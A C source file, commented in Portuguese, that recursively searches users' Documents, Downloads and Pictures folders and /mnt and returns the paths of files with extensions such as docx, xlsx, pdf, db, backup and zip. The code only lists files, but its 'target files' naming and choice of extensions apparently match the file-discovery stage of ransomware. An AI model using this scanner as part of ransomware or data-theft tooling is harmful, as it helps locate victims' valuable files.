#define _GNU_SOURCE
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <strings.h>
#include <limits.h>
#include <unistd.h>
#include <dirent.h>
#include <sys/stat.h>
#include <sys/types.h>
#include <pwd.h>

#ifndef PATH_MAX
#define PATH_MAX 4096
#endif

/*
 * Estrutura de lista dinâmica de strings.
 * A lista mantém sempre um ponteiro NULL após o último item válido.
 */
typedef struct {
    char **items;
    size_t len;
    size_t cap;
} StringList;

/* Libera toda a memória interna da lista. */
static void string_list_free(StringList *list) {
    if (!list) return;

    for (size_t i = 0; i < list->len; i++) {
        free(list->items[i]);
    }
    free(list->items);

    list->items = NULL;
    list->len = 0;
    list->cap = 0;
}

/* Adiciona uma cópia de 'value' à lista. Retorna 0 em caso de sucesso. */
static int string_list_append(StringList *list, const char *value) {
    if (!list || !value) return -1;

    if (list->len + 1 >= list->cap) {
        size_t newcap;

        if (list->cap == 0) {
            newcap = 16;
        } else if (list->cap > ((size_t)-1 - 16) / 2) {
            newcap = list->len + 2;
        } else {
            newcap = list->cap * 2;
        }

        if (newcap <= list->len) return -1;

        char **tmp = realloc(list->items, newcap * sizeof(*tmp));
        if (!tmp) return -1;

        list->items = tmp;
        list->cap = newcap;
    }

    char *copy = strdup(value);
    if (!copy) return -1;

    list->items[list->len++] = copy;
    list->items[list->len] = NULL;

    return 0;
}

/*
 * Expande o prefixo "~" ou "~/" para o diretório home do usuário.
 * Usa $HOME ou, se necessário, getpwuid()/getuid().
 */
static char *expand_tilde_path(const char *path) {
    if (!path) return NULL;

    if (path[0] != '~') return strdup(path);

    if (path[1] != '/' && path[1] != '\0') {
        /* Não suportamos ~usuario; retorna cópia para que opendir() falhe. */
        return strdup(path);
    }

    const char *home = getenv("HOME");

    if (home == NULL || home[0] == '\0') {
        struct passwd *pw = getpwuid(getuid());
        if (pw != NULL && pw->pw_dir != NULL) {
            home = pw->pw_dir;
        }
    }

    if (home == NULL || home[0] == '\0') {
        return strdup(path);
    }

    const char *rest = (path[1] == '/') ? path + 1 : "";

    size_t home_len = strlen(home);
    size_t rest_len = strlen(rest);

    char *result = malloc(home_len + rest_len + 1);
    if (!result) return NULL;

    memcpy(result, home, home_len);
    memcpy(result + home_len, rest, rest_len + 1);

    return result;
}

/*
 * Concatena 'dir' e 'name' em um caminho.
 * Retorna o tamanho que seria necessário; se for >= outsz, ocorreu truncamento.
 */
static size_t join_path(char *out, size_t outsz, const char *dir, const char *name) {
    if (!out || outsz == 0) return 0;

    const char *sep = "/";
    size_t dlen = strlen(dir);

    if (dlen > 0 && dir[dlen - 1] == '/') {
        sep = "";
    }

    int n = snprintf(out, outsz, "%s%s%s", dir, sep, name);
    if (n < 0) {
        out[0] = '\0';
        return outsz;
    }

    return (size_t)n;
}

/* Verifica se a extensão do arquivo está entre as permitidas. */
static int has_allowed_extension(const char *path) {
    if (!path) return 0;

    const char *base = strrchr(path, '/');
    base = base ? base + 1 : path;

    const char *dot = strrchr(base, '.');
    if (!dot || dot == base) return 0;

    const char *ext = dot + 1;

    static const char *allowed[] = {
        "xlsx", "docx", "pdf", "txt", "csv",
        "jpg", "png", "db", "backup", "psd", "zip", "rar"
    };

    size_t n = sizeof(allowed) / sizeof(allowed[0]);

    for (size_t i = 0; i < n; i++) {
        if (strcasecmp(ext, allowed[i]) == 0) {
            return 1;
        }
    }

    return 0;
}

/*
 * Tenta resolver o caminho com realpath() e adiciona à lista.
 * Se realpath() falhar, adiciona o caminho original.
 */
static int append_resolved_path(StringList *list, const char *path) {
    char resolved[PATH_MAX];
    const char *to_store = path;

    if (realpath(path, resolved) != NULL) {
        to_store = resolved;
    }

    return string_list_append(list, to_store);
}

/*
 * Percorre um diretório de forma recursiva.
 * Não desce em diretórios simbólicos.
 */
static int scan_directory_recursive(const char *dirpath, StringList *list) {
    DIR *dir = opendir(dirpath);

    if (!dir) {
        /* Sem permissão ou diretório inexistente: simplesmente ignora. */
        return 0;
    }

    struct dirent *entry;
    char fullpath[PATH_MAX];
    int rc = 0;

    while ((entry = readdir(dir)) != NULL) {
        if (strcmp(entry->d_name, ".") == 0 ||
            strcmp(entry->d_name, "..") == 0) {
            continue;
        }

        size_t used = join_path(fullpath, sizeof(fullpath),
                                dirpath, entry->d_name);

        if (used >= sizeof(fullpath)) {
            continue;
        }

        struct stat st;
        if (lstat(fullpath, &st) != 0) {
            continue;
        }

        /* Link simbólico: não desce se for diretório; apenas arquivo comum. */
        if (S_ISLNK(st.st_mode)) {
            struct stat target_st;

            if (stat(fullpath, &target_st) != 0) {
                continue;
            }

            if (S_ISREG(target_st.st_mode) && has_allowed_extension(fullpath)) {
                if (append_resolved_path(list, fullpath) != 0) {
                    rc = -1;
                    break;
                }
            }

            continue;
        }

        if (S_ISDIR(st.st_mode)) {
            rc = scan_directory_recursive(fullpath, list);
            if (rc != 0) {
                break;
            }
            continue;
        }

        if (S_ISREG(st.st_mode) && has_allowed_extension(fullpath)) {
            if (append_resolved_path(list, fullpath) != 0) {
                rc = -1;
                break;
            }
        }
    }

    closedir(dir);
    return rc;
}

/*
 * scan_target_files() percorre os diretórios alvo e retorna um vetor
 * de strings com os caminhos absolutos dos arquivos encontrados.
 *
 * O vetor é terminado por NULL e pode ser liberado assim:
 *
 *   char **files = scan_target_files();
 *   if (files) {
 *       for (size_t i = 0; files[i] != NULL; i++) {
 *           printf("%s\n", files[i]);
 *           free(files[i]);
 *       }
 *       free(files);
 *   }
 *
 * Se nenhum arquivo for encontrado, retorna NULL.
 * Em caso de erro grave de alocação, também retorna NULL.
 */
char **scan_target_files(void) {
    const char *roots[] = {
        "~/Documentos_Teste",
        "~/Documentos",
        "~/Downloads",
        "~/Imagens",
        "/mnt"
    };

    StringList list = {0};

    size_t num_roots = sizeof(roots) / sizeof(roots[0]);

    for (size_t i = 0; i < num_roots; i++) {
        char *expanded = expand_tilde_path(roots[i]);
        if (!expanded) {
            string_list_free(&list);
            return NULL;
        }

        int rc = scan_directory_recursive(expanded, &list);

        free(expanded);

        if (rc != 0) {
            string_list_free(&list);
            return NULL;
        }
    }

    if (list.len == 0) {
        string_list_free(&list);
        return NULL;
    }

    return list.items;
}